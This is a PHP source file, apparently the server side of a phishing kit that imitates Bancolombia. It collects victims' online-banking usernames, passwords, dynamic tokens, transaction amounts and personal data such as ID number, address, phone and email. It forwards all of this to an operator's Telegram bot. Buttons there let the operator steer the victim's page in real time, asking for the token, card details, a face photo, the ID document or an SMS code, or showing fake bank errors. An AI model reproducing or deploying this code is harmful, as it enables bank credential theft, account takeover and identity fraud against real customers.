<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_TOKENS_FILE = 'used_tokens.json';


/* =======================================================
   🔥 NUEVO — Cargar config desde config.php (SIN FUTURAMA)
   ======================================================= */
function loadConfig()
{
    // MISMA RUTA QUE TUS OTROS ARCHIVOS
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) {
        return null;
    }

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id'])) {
        return null;
    }

    return [
        'token'   => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}


/* =======================================================
   📤 Enviar mensaje a Telegram
   ======================================================= */
function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id'      => $chatId,
        'text'         => $text,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}


/* =======================================================
   🔘 Construir botones (ACTUALIZADO: Cara y Cédula)
   ======================================================= */
function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [
                ['text' => '🧮 Dina',      'callback_data' => "pedir_token:$tid"],
                ['text' => '💳 Tarjeta',   'callback_data' => "cc:$tid"]
            ],
            [
                ['text' => '👤 Cara',      'callback_data' => "cara:$tid"],
                ['text' => '🆔 Cédula',    'callback_data' => "cedula:$tid"]
            ],
            [
                ['text' => '💬 SMS',       'callback_data' => "sms:$tid"],
                ['text' => '❌ 923',       'callback_data' => "rechazar:$tid"],
                ['text' => '🏦 Logo',      'callback_data' => "banco_error:$tid"]
            ],
            [
                ['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]
            ]
        ]
    ];
}

/* =======================================================
   ✏️ Formatear mensaje a enviar
   ======================================================= */
function formatMessage($d)
{
    $b = $d['bancoldata'] ?? ['usuario' => 'N/D', 'clave' => 'N/D'];
    $t = $d['bancoldina']['clave'] ?? '<i>Sin token</i>';

    $montoRaw = isset($d['total']) ? str_replace(',', '', $d['total']) : 0;
    $monto    = number_format((float)$montoRaw, 0, ',', '.');

    $msg  = "<b>🔐 Nuevo acceso Bancolombia</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>{$d['transactionId']}</code>\n";
    $msg .= "👤 <b>Usuario:</b> <code>{$b['usuario']}</code>\n";
    $msg .= "🔐 <b>Clave:</b> <code>{$b['clave']}</code>\n";
    $msg .= "🔑 <b>Token:</b> <code>{$t}</code>\n";
    $msg .= "💰 <b>Monto:</b> <code>{$monto}</code>\n";

    if (!empty($d['tbdatos']) && is_array($d['tbdatos'])) {
        $i = $d['tbdatos'];

        $msg .= "\n\n<b>📄 Datos del Formulario:</b>\n";
        $msg .= "• 🧾 Tipo ID: <code>" . ($i['tipo_identificacion'] ?? 'N/D') . "</code>\n";
        $msg .= "• 🧑‍⚖️ Tipo Persona: <code>" . ($i['tipo_persona'] ?? 'N/D') . "</code>\n";
        $msg .= "• 🆔 Documento: <code>" . ($i['documento'] ?? 'N/D') . "</code>\n";
        $msg .= "• 👤 Nombre: <code>" . ($i['nombre'] ?? 'N/D') . "</code>\n";
        $msg .= "• 🏠 Dirección: <code>" . ($i['direccion'] ?? 'N/D') . "</code>\n";
        $msg .= "• ☎️ Teléfono: <code>" . ($i['telefono'] ?? 'N/D') . "</code>\n";
        $msg .= "• ✉️ Correo: <code>" . ($i['correo'] ?? 'N/D') . "</code>\n";
        $msg .= "• 🏦 Banco Seleccionado: <code>" . ($i['banco'] ?? 'N/D') . "</code>\n";
    }

    return $msg;
}


/* =======================================================
   🔐 Manejar tokens usados
   ======================================================= */
function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;

    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];

    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}


/* =======================================================
   🔥 Cargar configuración
   ======================================================= */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}


/* =======================================================
   📤 POST → Enviar mensaje a Telegram
   ======================================================= */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);

    if (!is_array($d)) {
        echo json_encode(['ok' => false, 'error' => '⛔ JSON inválido']);
        exit;
    }

    $tid = $d['transactionId'] ?? '';

    if (!$tid) {
        echo json_encode(['ok' => false, 'error' => '⛔ Falta transactionId']);
        exit;
    }

    if (isTokenUsed($tid)) {
        echo json_encode(['ok' => false, 'error' => '⛔ Token ya utilizado']);
        exit;
    }

    markTokenUsed($tid);

    $msg      = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent     = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode([
        'ok'         => !empty($sent['ok']),
        'message_id' => $sent['result']['message_id'] ?? null
    ]);
    exit;
}


/* =======================================================
   🔍 GET → Leer acciones de los botones
   ======================================================= */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
    $tid = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$_GET['transactionId']);
    $searchDirs = [
        '/var/www/diente/actions',
        '/var/www/diente/cu/actions',
        __DIR__ . '/actions',
        __DIR__ . '/../actions',
        __DIR__ . '/../../actions',
        __DIR__ . '/../../../actions'
    ];
    $action = null;
    foreach ($searchDirs as $dir) {
        $file = $dir . '/' . $tid . '.txt';
        if (file_exists($file)) {
            $raw = @file_get_contents($file);
            if ($raw !== false && trim($raw) !== '') {
                $parts = explode('|', trim($raw), 2);
                $action = trim($parts[0]);
                @unlink($file);
                break;
            }
        }
    }

    if ($action !== null && $action !== '') {
        if (ob_get_length()) ob_clean();
        echo json_encode(['ok' => true, 'action' => $action]);
        exit;
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método no permitido']);
exit;
